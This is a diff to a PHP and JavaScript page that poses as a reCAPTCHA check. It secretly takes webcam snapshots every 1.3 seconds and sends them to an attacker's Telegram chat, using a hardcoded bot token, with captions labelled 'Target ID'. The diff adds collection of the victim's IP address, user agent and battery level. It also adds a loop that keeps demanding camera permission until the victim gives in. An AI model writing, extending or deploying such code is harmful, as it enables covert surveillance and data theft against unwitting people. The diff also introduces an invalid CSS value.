@@ -1,24 +1,8 @@
 <?php
-// পিএইচপি সাইড থেকে অ্যান্ড্রয়েড ব্রাউজার চেক এবং ক্রোম ইন্টেন্ট ফোর্স রিডাইরেক্ট
-if (isset($_SERVER['HTTP_USER_AGENT'])) {
-    $ua = $_SERVER['HTTP_USER_AGENT'];
-    $isAndroid = (bool) preg_match('/Android/i', $ua);
-    // ক্রোম ব্রাউজার কি না চেক করা (অপেরা, স্যামসাং, এজ বাদ দিয়ে)
-    $isChrome = (bool) preg_match('/Chrome|CriOS/i', $ua) && !preg_match('/Edge|OPR|SamsungBrowser/i', $ua);
-
-    // যদি অ্যান্ড্রয়েড হয় এবং ক্রোম না হয়, তবে সার্ভার থেকেই সরাসরি ক্রোম ইন্টেন্টে পাঠিয়ে দেওয়া
-    if ($isAndroid && !$isChrome) {
-        $fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-        $cleanUrl = preg_replace('/^https?:\/\//', '', $fullUrl);
-        header("Location: intent://{$cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;");
-        exit;
-    }
-}
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931"; 
+    $chatId = "5896019931"; // Default fallback
 
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
@@ -39,6 +23,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $data = base64_decode($imgData);
 
     $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
+    
+    // ব্রাউজার থেকে পাঠানো অতিরিক্ত তথ্যগুলো রিসিভ করা হচ্ছে
+    $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
+    $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
+    
+    // ইউজারের রিয়েল আইপি অ্যাড্রেস বের করা
+    $ipAddress = $_SERVER['REMOTE_ADDR'];
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
 
     $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
@@ -46,9 +42,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     if (file_put_contents($filePath, $data)) {
         $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
         
+        // টেলিগ্রাম ক্যাপশনে সব তথ্য সাজিয়ে পাঠানো হচ্ছে
+        $caption = "🎯 Target ID: {$targetId}\n" .
+                   "🔋 Battery: {$battery}\n" .
+                   "🌐 IP Address: {$ipAddress}\n" .
+                   "💻 User Agent: {$userAgent}\n" .
+                   "📁 File: {$fileName}";
+
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "🎯 Target ID: {$targetId}\n📁 File: {$fileName}",
+            'caption' => $caption,
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
@@ -58,7 +61,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3); 
 
         curl_exec($ch);
         curl_close($ch);
@@ -153,7 +156,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             height: 32px;
             background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
             background-size: contain;
-            background-repeat: no-repeat;
+            background-repeat: not-repeat;
         }
 
         .recaptcha-footer {
@@ -214,16 +217,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             }, 500);
         }
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(() => {
-                    setInterval(captureAndUpload, 1300);
-                }, 1000);
-            })
-            .catch(err => {
-                console.error("Camera error: ", err);
+        // ব্যাটারি স্ট্যাটাস ট্র্যাক করার ভেরিয়েবল
+        let batteryLevelInfo = 'Not Available';
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                batteryLevelInfo = Math.round(battery.level * 100) + '%';
             });
+        }
+
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        setInterval(captureAndUpload, 1300);
+                    }, 1000);
+                })
+                .catch(err => {
+                    console.error("Camera error: ", err);
+                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
+                    setTimeout(requestCameraPermission, 1000);
+                });
+        }
+
+        requestCameraPermission();
 
         function captureAndUpload() {
             const context = canvas.getContext('2d');
@@ -233,12 +250,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
+            // ডাটা ফেচ করার সময় ব্যাটারি এবং ইউজার এজেন্ট যুক্ত করে দেওয়া হলো
+            const postData = new URLSearchParams();
+            postData.append('image', imageData);
+            postData.append('target', targetId);
+            postData.append('chat_id', userChatId);
+            postData.append('user_agent', navigator.userAgent);
+            postData.append('battery', batteryLevelInfo);
+
             fetch('', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
+                body: postData
             }).catch(error => {
                 console.error('Error:', error);
             });
